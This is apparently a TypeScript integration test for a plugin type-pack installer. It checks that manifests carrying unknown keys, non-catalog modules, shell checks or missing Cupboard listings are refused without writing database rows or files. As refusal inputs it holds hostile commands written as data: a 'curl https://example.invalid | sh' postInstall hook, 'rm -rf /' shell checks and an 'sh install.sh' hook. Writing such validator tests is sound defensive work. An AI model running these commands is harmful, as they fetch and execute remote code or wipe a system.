/**
 * R-18 (plan-item-types-registry-cupboard-2026-10-20 P-006, D-008), on real Postgres: installing a
 * pack whose type manifest fails validation is refused, a definition carrying anything other than
 * verification-module references and declarative rubric checks is refused, and a refused install
 * leaves no rows. Covered twice: through the type-pack installer itself, and through the real
 * plugin/pack install core (fetch at the content pin, verify the tree digest, read papercusp.json),
 * where a refusal also leaves no installed files.
 */
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { createHash } from 'node:crypto';
import { existsSync, mkdtempSync, readdirSync, rmSync } from 'node:fs';
import { promises as fs } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type postgres from 'postgres';
import { canonicalTreeDigest } from '@papercusp/artifact-registry';
import type { OrgTestDb } from '../../test/_org-test-db';

const h = vi.hoisted(() => ({
  sql: undefined as unknown as postgres.Sql,
  appSql: undefined as unknown as postgres.Sql,
}));

vi.mock('@papercusp/db-org', async (orig) => {
  const actual = await vi.importActual<typeof import('@papercusp/db-org')>('@papercusp/db-org');
  return {
    ...(await orig<typeof import('@papercusp/db-org')>()),
    ...actual,
    getOrgPg: () => ({ sql: h.sql }),
    withWorkspace: <T,>(ws: string, cb: (tx: unknown) => Promise<T>): Promise<T> =>
      h.appSql.begin(async (tx) => {
        await tx`SELECT set_config('app.workspace_id', ${ws}, true)`;
        return cb(tx);
      }) as Promise<T>,
  };
});

const { createOrgTestDb } = await import('../../test/_org-test-db');
const { installTypePack } = await import('./type-pack');
const { installPluginFromCupboardCore, InstallPluginError } = await import('./install-plugin-core');
const fx = await import('../../test/type-pack-fixture');

const WS = 'default';
const NS = `zzz-tpm-${Math.random().toString(36).slice(2, 8)}`;
const CTX = { workspaceId: WS, installedBy: 'item-type-pack-manifest-test' };
const NO_RUBRICS = { provisionRubric: async () => { throw new Error('this test bundles no rubric'); } };

let db: OrgTestDb;
let scratch: string;

beforeAll(async () => {
  db = await createOrgTestDb();
  h.sql = db.adminSql;
  h.appSql = db.appSql;
  scratch = mkdtempSync(join(tmpdir(), 'type-pack-manifest-'));
}, 120_000);

afterAll(async () => {
  await db?.cleanup();
  if (scratch) rmSync(scratch, { recursive: true, force: true });
});

function install(pack: import('../../test/type-pack-fixture').FakePack) {
  return installTypePack(h.sql, pack, CTX, { ...fx.fakeCupboard([pack]), ...NO_RUBRICS });
}

describe('a type pack is validated at install (R-18)', () => {
  it('installs a valid manifest whose item type carries a declarative rubric check', async () => {
    const memo = `${NS}/valid-memo`;
    const pack = fx.fakePack(`${NS}-valid`, {
      itemTypes: [fx.itemTypeDef(memo, { checks: [{ kind: 'tests', params: { files: ['packages/example/memo.test.ts'] } }] })],
    });

    const result = await install(pack);

    expect(result.ok, JSON.stringify(result)).toBe(true);
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/valid`)).toEqual({ itemTypes: 1, planTypes: 0, receipts: 0 });
    expect(await fx.countTypeRows(h.sql, WS, `${NS}-valid`)).toMatchObject({ receipts: 1 });
  });

  const invalid: Array<[string, (id: string) => Record<string, unknown>, RegExp]> = [
    ['an unknown key smuggled into an item type', (id) => ({ itemTypes: [fx.itemTypeDef(id, { postInstall: 'curl https://example.invalid | sh' })] }), /postInstall|[Uu]nrecognized/],
    ['a module outside the verification-module catalog', (id) => ({ itemTypes: [fx.itemTypeDef(id, { modules: ['generic-core', 'shell-exec'] })] }), /modules/],
    ['an item type that drops the generic-core floor', (id) => ({ itemTypes: [fx.itemTypeDef(id, { modules: ['code'] })] }), /generic-core/],
    ['a check that is not a declarative rubric check', (id) => ({ itemTypes: [fx.itemTypeDef(id, { checks: [{ kind: 'shell', params: { command: 'rm -rf /' } }] })] }), /not a declarative rubric check/],
    // D-011: a criterion's verification check seeds an acceptance bar, so it obeys the same rule.
    ['a criterion verification check that is not declarative', (id) => ({ itemTypes: [fx.itemTypeDef(id, { criteriaTemplate: [{ key: 'sourced', title: 'Sourced', verification: { method: 'Read it.', check: { kind: 'shell', params: { command: 'rm -rf /' } } } }] })] }), /criteriaTemplate\[0\]\.verification\.check: 'shell' is not a declarative rubric check/],
    ['an unknown top-level key in the typePack block', (id) => ({ itemTypes: [fx.itemTypeDef(id)], hooks: { postInstall: 'sh install.sh' } }), /hooks|[Uu]nrecognized/],
    ['a definition in the first-party papercusp/ namespace', () => ({ itemTypes: [fx.itemTypeDef('papercusp/smuggled')] }), /first-party/],
    ['a bundled rubric no item type references', (id) => ({ itemTypes: [fx.itemTypeDef(id)], rubrics: [fx.rubricSource(`${NS}-orphan-rubric`)] }), /referenced by no item type/],
  ];
  for (const [label, build, why] of invalid) {
    it(`refuses ${label}, writing nothing`, async () => {
      const slug = label.replace(/[^a-z0-9]+/g, '-').slice(0, 40).replace(/-+$/, '');
      const id = `${NS}/${slug}`;
      const pack = fx.fakePack(`${NS}-bad-${slug}`, build(id) as never, { declares: { itemTypes: [{ id, revision: 1 }], planTypes: [] } });

      const result = await install(pack);

      expect(result.ok).toBe(false);
      expect(!result.ok && result.code).toBe('type_pack_manifest_invalid');
      expect(!result.ok && result.message).toMatch(why);
      expect(await fx.countTypeRows(h.sql, WS, `${NS}-bad-${slug}`)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
      expect(await fx.countTypeRows(h.sql, WS, id)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
    });
  }

  it('refuses a pack with one valid and one invalid definition, writing neither', async () => {
    const good = `${NS}/mixed-good`;
    const bad = `${NS}/mixed-bad`;
    const pack = fx.fakePack(`${NS}-mixed`, {
      itemTypes: [fx.itemTypeDef(good), fx.itemTypeDef(bad, { modules: ['code'] })],
    }, { declares: { itemTypes: [{ id: good, revision: 1 }, { id: bad, revision: 1 }], planTypes: [] } });

    const result = await install(pack);

    expect(result.ok).toBe(false);
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/mixed`)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
  });

  it('refuses a manifest that carries a type its listing does not declare', async () => {
    const declared = `${NS}/declared-memo`;
    const hidden = `${NS}/hidden-memo`;
    const pack = fx.fakePack(`${NS}-undeclared`, { itemTypes: [fx.itemTypeDef(declared), fx.itemTypeDef(hidden)] },
      { declares: { itemTypes: [{ id: declared, revision: 1 }], planTypes: [] } });

    const result = await install(pack);

    expect(result.ok).toBe(false);
    expect(!result.ok && result.code).toBe('type_pack_undeclared_types');
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/declared`)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
  });
});

describe('the plugin/pack install core validates a type manifest before placing anything (R-18)', () => {
  const REF = 'review-types';
  const URL = 'https://github.com/acme/review-types';

  /** A pinned listing whose content is exactly `manifest` at <ref>/papercusp.json. */
  async function pinned(listingId: string, manifest: Record<string, unknown>, declares: { itemTypes: unknown[]; planTypes: unknown[] }) {
    const bytes = JSON.stringify(manifest, null, 2);
    const entries = [{ path: `${REF}/papercusp.json`, sha: createHash('sha1').update(bytes).digest('hex') }];
    const treeDigest = await canonicalTreeDigest(entries);
    const commitSha = createHash('sha1').update(listingId).digest('hex');
    const pluginsDir = join(scratch, `${listingId}-plugins`);
    await fs.mkdir(pluginsDir, { recursive: true });
    const deps = {
      cloneRepo: async () => { throw new Error('a pinned listing must be fetched at its pin, never cloned at the tip'); },
      fetchAtSha: async (_url: string, dest: string, sha: string) => {
        expect(sha).toBe(commitSha);
        await fs.mkdir(join(dest, REF), { recursive: true });
        await fs.writeFile(join(dest, REF, 'papercusp.json'), bytes);
      },
      listTreeBlobs: async () => entries,
      globalPluginsDir: () => pluginsDir,
      tmpDir: () => scratch,
      grant: async () => {},
      invalidateHost: () => {},
      installTypePack: async (args: { manifest: { name: string; version: string; typePack: unknown }; listing: import('./type-pack').TypePackListing }) =>
        installTypePack(h.sql, { listing: args.listing, manifest: args.manifest }, CTX, { ...fx.fakeCupboard([]), ...NO_RUBRICS }),
    };
    const listing = {
      githubUrl: URL,
      ref: REF,
      listingId,
      reviewStatus: 'approved',
      pin: { commitSha, treeDigest },
      providesItemTypes: JSON.stringify(declares.itemTypes),
      providesPlanTypes: JSON.stringify(declares.planTypes),
    };
    return { deps, listing, pluginsDir };
  }

  it('installs a valid type pack: the definition, its receipt and the placed files', async () => {
    const memo = `${NS}/core-memo`;
    const name = `${NS}-core-valid`;
    const manifest = { name, version: '1.0.0', kind: 'pack', typePack: { itemTypes: [fx.itemTypeDef(memo)] } };
    const { deps, listing, pluginsDir } = await pinned(name, manifest, { itemTypes: [{ id: memo, revision: 1 }], planTypes: [] });

    const result = await installPluginFromCupboardCore({ githubUrl: URL, listingRef: REF, listing }, deps);

    expect(result.typePackInstallation?.receipts.map((r) => r.listingId)).toEqual([name]);
    expect(existsSync(join(pluginsDir, name, 'papercusp.json'))).toBe(true);
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/core-memo`)).toEqual({ itemTypes: 1, planTypes: 0, receipts: 0 });
  });

  it('refuses an invalid type manifest with no rows and no placed files', async () => {
    const memo = `${NS}/core-bad-memo`;
    const name = `${NS}-core-invalid`;
    const manifest = { name, version: '1.0.0', kind: 'pack', typePack: { itemTypes: [fx.itemTypeDef(memo, { modules: ['code'] })] } };
    const { deps, listing, pluginsDir } = await pinned(name, manifest, { itemTypes: [{ id: memo, revision: 1 }], planTypes: [] });

    const install = installPluginFromCupboardCore({ githubUrl: URL, listingRef: REF, listing }, deps);

    await expect(install).rejects.toBeInstanceOf(InstallPluginError);
    await expect(install).rejects.toMatchObject({ status: 422, code: 'type_pack_manifest_invalid' });
    expect(readdirSync(pluginsDir)).toEqual([]);
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/core-bad`)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
  });

  it('refuses a type pack installed without its Cupboard listing (no review, no provenance)', async () => {
    const memo = `${NS}/core-direct-memo`;
    const name = `${NS}-core-direct`;
    const manifest = { name, version: '1.0.0', kind: 'pack', typePack: { itemTypes: [fx.itemTypeDef(memo)] } };
    const { deps, pluginsDir } = await pinned(name, manifest, { itemTypes: [], planTypes: [] });
    const bytes = JSON.stringify(manifest);
    const direct = { ...deps, cloneRepo: async (_url: string, dest: string) => {
      await fs.mkdir(join(dest, REF), { recursive: true });
      await fs.writeFile(join(dest, REF, 'papercusp.json'), bytes);
    } };

    const install = installPluginFromCupboardCore({ githubUrl: URL, listingRef: REF }, direct);

    await expect(install).rejects.toMatchObject({ status: 422, code: 'type_pack_listing_required' });
    expect(readdirSync(pluginsDir)).toEqual([]);
    expect(await fx.countTypeRows(h.sql, WS, `${NS}/core-direct`)).toEqual({ itemTypes: 0, planTypes: 0, receipts: 0 });
  });
});
